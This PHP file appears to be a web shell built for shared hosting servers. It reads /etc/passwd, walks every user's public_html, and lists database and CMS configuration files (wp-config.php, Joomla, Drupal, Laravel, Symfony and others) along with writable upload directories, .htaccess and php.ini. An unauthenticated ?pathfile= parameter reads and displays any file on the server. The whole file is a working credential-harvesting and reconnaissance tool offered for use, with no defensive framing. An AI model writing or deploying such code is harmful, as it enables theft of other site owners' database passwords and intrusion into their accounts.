<?php
/**
 * Created by PhpStorm.
 * User: lenon
 * Date: 27/08/16
 * Time: 14:44
 */

if(isset($_GET['pathfile'])&&!empty($_GET['pathfile'])){
    $myfile = fopen($_GET['pathfile'], "r") or die("Unable to open file!");
    echo '<pre>'.htmlspecialchars(fread($myfile,filesize($_GET['pathfile']))).'<pre>';
    fclose($myfile);
    exit();
}
?>
<html>
<head>
    <link rel="stylesheet" href="//code.jquery.com/ui/1.12.0/themes/base/jquery-ui.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.12/css/jquery.dataTables.min.css">
    <script type="application/javascript" src="//code.jquery.com/jquery-1.12.3.js"></script>
    <script type="application/javascript" src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
    <script type="application/javascript" src="https://code.jquery.com/ui/1.12.0/jquery-ui.js"></script>
    <script type="application/javascript">
        $(document).ready(function() {
            $('#table').DataTable();
            $('#table').on( 'draw.dt', function () {
                $('.modalasz').click(function () {
                    if($(this).attr('data-path')!=""){
                        $.get("?pathfile="+$(this).attr('data-path'), function(data) {
                            $('#myModal').html(data);
                        });
                    }else{
                        $('#myModal').html("folder with permission writter");
                    }

                    $('#myModal').dialog({
                        width: 1000
                    });
                });
            });
        } );
    </script>
    <style>
        #myModal{
            background: black;
            color: #fff;
        }
    </style>
</head>
<body>

<?php

if(@file('/etc/passwd')){
    $users = file('/etc/passwd');

    ?>
    <table id="table" class="display" cellspacing="0" width="100%">
        <thead>
            <tr>
                <th>
                    id
                </th>
                <th>
                    user
                </th>
                <th>
                    index.php
                </th>
                <th>
                    public writter
                </th>
                <th>
                    Default
                </th>
                <th>
                    Drupal 6
                </th>
                <th>
                    Drupal 7
                </th>
                <th>
                    write joom up
                </th>
                <th>
                    write wp up
                </th>
                <th>
                    conf
                </th>
                <th>
                    vb
                </th>
                <th>
                    joo
                </th>
                <th>
                    wp
                </th>
                <th>
                    laravel
                </th>
                <th>
                    codeigniter
                </th>
                <th>
                    symfony
                </th>
                <th>
                    zend
                </th>
                <th>
                    htaccess
                </th>
                <th>
                    php.ini
                </th>
            </tr>
        </thead>
        <tfoot>
        <tr>
            <th>
                id
            </th>
            <th>
                user
            </th>
            <th>
                public writter
            </th>
            <th>
                index.php
            </th>
            <th>
                Default
            </th>
            <th>
                Drupal 6
            </th>
            <th>
                Drupal 7
            </th>
            <th>
                write joom up
            </th>
            <th>
                write wp up
            </th>
            <th>
                conf
            </th>
            <th>
                vb
            </th>
            <th>
                joo
            </th>
            <th>
                wp
            </th>
            <th>
                laravel
            </th>
            <th>
                codeigniter
            </th>
            <th>
                symfony
            </th>
            <th>
                zend
            </th>
            <th>
                htaccess
            </th>
            <th>
                php.ini
            </th>
        </tr>
        </tfoot>
        <tbody align="center">
    <?php
    foreach($users as $key=> $user) {

        $user = explode(':', $user);
        if (is_dir("/home/" . $user[0] . "/public_html/")) {
            ?>

            <tr>
                <td>
                    <?php echo $key; ?>
                </td>
                <td>
                    <?php echo $user[0]; ?>
                </td>
                <td>
                    <?php
                    $pathindex = '/home/' . $user[0] . '/public_html/index.php';
                    if (file_exists($pathindex)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"  href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>
                </td>
                <td>
                    <?php
                    $pathpublicwritter = '/home/' . $user[0] . '/public_html/';
                    if (is_writable($pathpublicwritter)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathpublicwritter; ?>"  href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>
                </td>
                <td>
                    <?php
                        $url = array();
                        $url[]='/home/' . $user[0] . '/public_html/database.php';
                        $url[]='/home/' . $user[0] . '/public_html/conexao.php';
                        $url[]='/home/' . $user[0] . '/public_html/connection.php';
                        $url[]='/home/' . $user[0] . '/public_html/conectar.php';
                        $url[]='/home/' . $user[0] . '/public_html/conecta.php';
                        $url[]='/home/' . $user[0] . '/public_html/db.php';
                        $url[]='/home/' . $user[0] . '/public_html/bd.php';
                        $url[]='/home/' . $user[0] . '/public_html/con.php';
                        $url[]='/home/' . $user[0] . '/public_html/conn.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/database.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/conexao.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/connection.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/conectar.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/conecta.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/db.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/bd.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/con.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/conn.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/configuration.php';
                        $url[]='/home/' . $user[0] . '/public_html/includes/configuracao.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/database.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/conexao.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/connection.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/conectar.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/conecta.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/db.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/bd.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/con.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/conn.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/configuration.php';
                        $url[]='/home/' . $user[0] . '/public_html/include/configuracao.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/database.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/conexao.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/connection.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/conectar.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/conecta.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/db.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/bd.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/con.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/conn.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/configuration.php';
                        $url[]='/home/' . $user[0] . '/public_html/config/configuracao.php';
                        $url[]='/home/' . $user[0] . '/public_html/app/config/database.yml';
                        $url[]='/home/' . $user[0] . '/public_html/app/config/config.yml';
                        $url[]='/home/' . $user[0] . '/public_html/app/config/parameters.yml';
                        foreach($url as $u){
                            if (file_exists($u)) {
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $u; ?>" href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                        }

                    ?>
                </td>
                <td>
                    <?php
                    $pathconfd6 = '/home/' . $user[0] . '/public_html/sites/default/default.settings.php';
                    if (file_exists($pathconfd6)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd6; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>
                </td>
                <td>
                    <?php
                    $pathconfd7 = '/home/' . $user[0] . '/public_html/sites/default/settings.php';
                    if (file_exists($pathconfd7)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd7; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>
                </td>
                <td>
                    <?php
                    if ((is_writable("/home/" . $user[0] . "/public_html/images/")) OR (is_writable("/home/" . $user[0] . "/public_html/tmp/") ) ){
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo ""; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>
                </td>
                <td>
                    <?php
                    if (is_writable("/home/" . $user[0] . "/public_html/wp-content/uploads/")) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo ""; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>
                </td>
                <td>
                    <?php
                    $pathconfno = '/home/' . $user[0] . '/public_html/config.php';
                    if (file_exists($pathconfno)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfno; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathconfvb = '/home/' . $user[0] . '/public_html/core/includes/config.php';
                    if (file_exists($pathconfvb)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfvb; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathconfjoom = "/home/" . $user[0] . "/public_html/configuration.php";
                    if (file_exists($pathconfjoom)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfjoom; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathwpconfig = "/home/" . $user[0] . "/public_html/wp-config.php";
                    if (file_exists($pathwpconfig)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathwpconfig; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathlaravel = "/home/" . $user[0] . "/public_html/config/database.php";
                    if (file_exists($pathlaravel)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathlaravel; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathcodeigniter = "/home/" . $user[0] . "/public_html/application/config/database.php";
                    if (file_exists($pathcodeigniter)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathcodeigniter; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathsymfony = "/home/" . $user[0] . "/public_html/app/config/parameters.yml";
                    if (file_exists($pathsymfony)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathsymfony; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathzend = "/home/" . $user[0] . "/public_html/application/config/application.ini";
                    if (file_exists($pathzend)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathzend; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathhtaccess = "/home/" . $user[0] . "/public_html/.htaccess";
                    if (file_exists($pathhtaccess)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    if(is_writable($pathhtaccess)){
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
                <td>
                    <?php
                    $pathphpini = "/home/" . $user[0] . "/public_html/php.ini";
                    if (file_exists($pathphpini)) {
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    if(is_writable($pathphpini)){
                        ?>
                        <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>" href="#">
                            &#10004;
                        </a>
                        <?php
                    }
                    ?>

                </td>
            </tr>

            <?php
        }
    }?>
        </tbody>
    <?php
}
    ?>

    </table>
    <!-- Modal -->
    <div id="myModal" role="dialog">

    </div>

</body>
</html>
